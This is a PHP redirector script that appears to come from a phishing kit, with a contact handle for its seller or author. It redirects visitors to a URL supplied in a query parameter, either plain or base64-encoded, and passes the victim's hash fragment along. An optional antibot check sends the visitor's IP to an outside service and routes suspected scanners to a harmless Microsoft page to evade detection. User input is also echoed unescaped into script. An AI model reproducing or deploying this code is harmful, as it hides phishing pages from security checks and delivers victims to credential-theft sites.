<?php
/*  Need help? Contact ICQ: @anyhopes */
@session_start();
error_reporting(0);
set_time_limit(0);
$priv8 = 0; // if you change to 1 antibot will active (only real IP can open)
$botlanding = "https://privacy.microsoft.com/"; // link for robot if detected
$anyhopes = $_GET['redirect'];
$exp = explode('#', $anyhopes);$direct = $exp[0];
if ($priv8 == '1'){
$iprobot = urlencode($_SERVER['REMOTE_ADDR']);
$curlbot = curl_init();
curl_setopt($curlbot, CURLOPT_URL, "http://whoerisp.com/public/?robots=".$iprobot);
curl_setopt($curlbot, CURLOPT_HEADER, 0);
curl_setopt($curlbot, CURLOPT_RETURNTRANSFER, TRUE);
$checkbot = curl_exec($curlbot);
	if(!preg_match("/Bad|IP|Address/",$checkbot)){
	    if (!empty($direct)){
            echo "<script type=\"text/javascript\">if (location.hash) {var hash = window.location.hash,cleanhash = hash.replace(\"#\", \"\");window.location.href = \"$direct#\"+(cleanhash);}</script>\n";
        }
		elseif(preg_match("/@/",$anyhopes)){
			    echo "<script type=\"text/javascript\">window.location.href = \"$anyhopes\"</script>\n";
		    } else {
			$data = base64_decode($anyhopes);
            echo "<script type=\"text/javascript\">window.location.href = \"$data\"</script>\n";
		    }
    } else {
    echo "<script type=\"text/javascript\">window.location.href = \"$botlanding\"</script>\n";
    }
} else {
if (!empty($direct)){
    echo "<script type=\"text/javascript\">if (location.hash) {var hash = window.location.hash,cleanhash = hash.replace(\"#\", \"\");window.location.href = \"$direct#\"+(cleanhash);}</script>\n";
} elseif(preg_match("/@/",$anyhopes)){
    echo "<script type=\"text/javascript\">window.location.href = \"$anyhopes\"</script>\n";
    } else {
        $data = base64_decode($anyhopes);
        echo "<script type=\"text/javascript\">window.location.href = \"$data\"</script>\n";
    }
}
?>
